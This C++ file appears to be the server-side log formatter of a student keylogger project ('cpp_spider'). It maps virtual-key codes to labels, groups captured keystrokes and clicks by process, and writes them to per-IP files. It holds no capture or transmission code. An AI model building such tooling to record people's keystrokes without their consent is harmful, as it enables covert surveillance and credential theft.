//
// s_input.cpp for cpp_spider in /home/fortevg/rendu
//
// Made by Gabriel Forteville
// datain   <gabriel.forteville@epitech.eu>
//
// Started on  sam. oct. 7 16:20:19 2017 Gabriel Forteville
// Last update Mon Oct  9 23:11:24 2017 nicolas
//

#include <list>
#include <sys/stat.h>
#include <fstream>
#include <cstring>
#include <iostream>
#include "log.hpp"
#include "sql/Database.hpp"

log::log()
{
  vkCodesMap[1] = "[L-click]";
  vkCodesMap[2] = "[R-click]";
  vkCodesMap[3] = "[Control-break processing]";
  vkCodesMap[4] = "Middle mouse button";
  vkCodesMap[5] = "X1 mouse button";
  vkCodesMap[6] = "X2 mouse button";
  vkCodesMap[8] = "[BACKSPACE key]";
  vkCodesMap[9] = "[TAB]";
  vkCodesMap[12] = "[CLEAR]";
  vkCodesMap[13] = "[ENTER]";
  vkCodesMap[16] = "[SHIFT]";
  vkCodesMap[17] = "[CTRL]";
  vkCodesMap[18] = "[ALT]y";
  vkCodesMap[19] = "[PAUSE]";
  vkCodesMap[20] = "[CAPS LOCK]";
  vkCodesMap[21] = "[IME Kana mode]";
  vkCodesMap[22] = "[IME Hangul mode]";
  vkCodesMap[23] = "[IME Junja mode]";
  vkCodesMap[24] = "[IME final mode]";
  vkCodesMap[25] = "[IME Kanji mode]";
  vkCodesMap[27] = "[ESC]";
  vkCodesMap[28] = "[IME convert]";
  vkCodesMap[29] = "[IME nonconvert]";
  vkCodesMap[30] = "[IME accept]";
  vkCodesMap[31] = "[IME mode change request]";
  vkCodesMap[32] = " ";
  vkCodesMap[33] = "PAGE UP";
  vkCodesMap[35] = "END";
  vkCodesMap[36] = "[HOME]";
  vkCodesMap[37] = "[LEFT ARROW]";
  vkCodesMap[38] = "[UP ARROW]";
  vkCodesMap[39] = "[RIGHT ARROW]";
  vkCodesMap[40] = "[DOWN ARROW]";
  vkCodesMap[41] = "[SELECT]";
  vkCodesMap[42] = "[PRINT]";
  vkCodesMap[34] = "[PAGE DOWN]";
  vkCodesMap[43] = "[EXECUTE]";
  vkCodesMap[44] = "[PRINT SCREEN]";
  vkCodesMap[45] = "[INS]";
  vkCodesMap[46] = "[DEL]";
  vkCodesMap[47] = "[HELP]";
  vkCodesMap[48] = "à";
  vkCodesMap[49] = "&";
  vkCodesMap[50] = "é";
  vkCodesMap[51] = "\"";
  vkCodesMap[52] = "'";
  vkCodesMap[53] = "(";
  vkCodesMap[54] = "-";
  vkCodesMap[55] = "è";
  vkCodesMap[56] = "_";
  vkCodesMap[57] = "ç";
  vkCodesMap[65] = "a";
  vkCodesMap[66] = "b";
  vkCodesMap[67] = "c";
  vkCodesMap[68] = "d";
  vkCodesMap[69] = "e";
  vkCodesMap[70] = "f";
  vkCodesMap[71] = "g";
  vkCodesMap[72] = "h";
  vkCodesMap[73] = "i";
  vkCodesMap[74] = "j";
  vkCodesMap[75] = "k";
  vkCodesMap[76] = "l";
  vkCodesMap[77] = "m";
  vkCodesMap[78] = "n";
  vkCodesMap[79] = "o";
  vkCodesMap[80] = "p";
  vkCodesMap[81] = "q";
  vkCodesMap[82] = "r";
  vkCodesMap[83] = "s";
  vkCodesMap[84] = "t";
  vkCodesMap[85] = "u";
  vkCodesMap[86] = "v";
  vkCodesMap[87] = "w";
  vkCodesMap[88] = "x";
  vkCodesMap[89] = "y";
  vkCodesMap[90] = "z";
  vkCodesMap[91] = "[Left Windows]";
  vkCodesMap[92] = "[Right Windows]";
  vkCodesMap[93] = "[Applications]";
  vkCodesMap[95] = "[Computer Sleep]";
  vkCodesMap[97] = "1";
  vkCodesMap[98] = "2";
  vkCodesMap[99] = "3";
  vkCodesMap[100] = "4";
  vkCodesMap[101] = "5";
  vkCodesMap[102] = "6";
  vkCodesMap[103] = "7";
  vkCodesMap[104] = "8";
  vkCodesMap[105] = "9";
  vkCodesMap[112] = "[f1]";
  vkCodesMap[113] = "[f2]";
  vkCodesMap[114] = "[f3]";
  vkCodesMap[115] = "[f4]";
  vkCodesMap[116] = "[f5]";
  vkCodesMap[117] = "[f6]";
  vkCodesMap[118] = "[f7]";
  vkCodesMap[119] = "[f8]";
  vkCodesMap[120] = "[f9]";
  vkCodesMap[121] = "[f10]";
  vkCodesMap[122] = "[f11]";
  vkCodesMap[123] = "[f12]";
  vkCodesMap[124] = "[f13]";
  vkCodesMap[125] = "[f14]";
  vkCodesMap[126] = "[f15]";
  vkCodesMap[127] = "[f16]";
  vkCodesMap[128] = "[f17]";
  vkCodesMap[129] = "[f18]";
  vkCodesMap[130] = "[f19]";
  vkCodesMap[131] = "[f20]";
  vkCodesMap[132] = "[f21]";
  vkCodesMap[133] = "[f22]";
  vkCodesMap[134] = "[f23]";
  vkCodesMap[135] = "[f24]";
  vkCodesMap[144] = "[NUM LOCK]";
  vkCodesMap[145] = "[SCROLL LOCK]";
  vkCodesMap[160] = "[Left SHIFT]";
  vkCodesMap[161] = "[Right SHIFT]";
  vkCodesMap[162] = "[Left CONTROL]";
  vkCodesMap[163] = "[Right CONTROL]";
  vkCodesMap[164] = "[Left MENU]";
  vkCodesMap[165] = "[Right MENU]";
  vkCodesMap[166] = "[Browser Back]";
  vkCodesMap[167] = "[Browser Forward]";
  vkCodesMap[168] = "[Browser Refresh]";
  vkCodesMap[169] = "[Browser Stop]";
  vkCodesMap[170] = "[Browser Search]";
  vkCodesMap[171] = "[Browser Favorites]";
  vkCodesMap[172] = "[Browser Start and Home]";
  vkCodesMap[173] = "[Volume Mute]";
  vkCodesMap[174] = "[Volume Down]";
  vkCodesMap[175] = "[Volume Up]";
  vkCodesMap[176] = "[Next Track]";
  vkCodesMap[177] = "[Previous Track]";
  vkCodesMap[178] = "[Stop Media]";
  vkCodesMap[179] = "[Play/Pause Media]";
  vkCodesMap[180] = "[Start Mail]";
  vkCodesMap[181] = "[Select Media]";
  vkCodesMap[186] = "m";
  vkCodesMap[187] = "=";
  vkCodesMap[188] = ",";
  vkCodesMap[189] = "-";
  vkCodesMap[190] = ";";
  vkCodesMap[191] = ":";
  vkCodesMap[219] = "^";
}

void process_name(std::list<s_input>::iterator &prev, std::stringstream &fdata, std::list<s_input>::iterator it)
{
  static auto first_pass = true;

  if (first_pass)
    {
      fdata << "process name: " << it->process << std::endl << "\"";
      first_pass = false;
    }
  else
    prev++;
}

void check_special(char specKey, std::stringstream &fdata)
{
  uint8_t mask = 1;

  if (specKey != 0)
    {
      fdata << "[";
      while (specKey)
	{
	  switch (specKey & mask)
	    {
	      case MAJ: fdata << "MAJ "; break;
	      case ALT: fdata << "ALT "; break;
	      case CTRL: fdata << "CTRL "; break;
	      case ALTGR: fdata << "ALTGR "; break;
	    }
	  specKey &= ~mask;
	  mask <<= 1;
	}
      fdata << "\b]";
    }
}

void log::analyse_data(std::list<s_input> &ldata, std::stringstream &fdata)
{
  std::list<s_input>::iterator 	prev = ldata.begin();

  for (std::list<s_input>::iterator it = ldata.begin(); it != ldata.end(); it++)
    {
      if (prev->timestamp + 10 < it->timestamp || std::strcmp(prev->process, it->process) != 0)
	fdata << "\"" << std::endl << "------------" << std::endl << "process name: " << it->process << std::endl << "\"";
      process_name(prev, fdata, it);
      fdata << vkCodesMap[it->inputCode] << std::endl;
      if (it->inputCode <= 2)
	fdata << " x: " << it->posX << " y: " << it->posY << "]";
      check_special(it->specialKey, fdata);
    }
  fdata << "\"" << std::endl << std::endl << "---------------------------END PACKAGE---------------------------" << std::endl << std::endl;
}

void log::write_data(std::stringstream &fdata, const int &ip)
{
  std::ofstream			client;

  mkdir("./logClean", S_IRWXU);
  client.open("./logClean/" + std::to_string(ip), std::ios::out | std::ios::app);
  client << fdata.str();
  client.close();
}
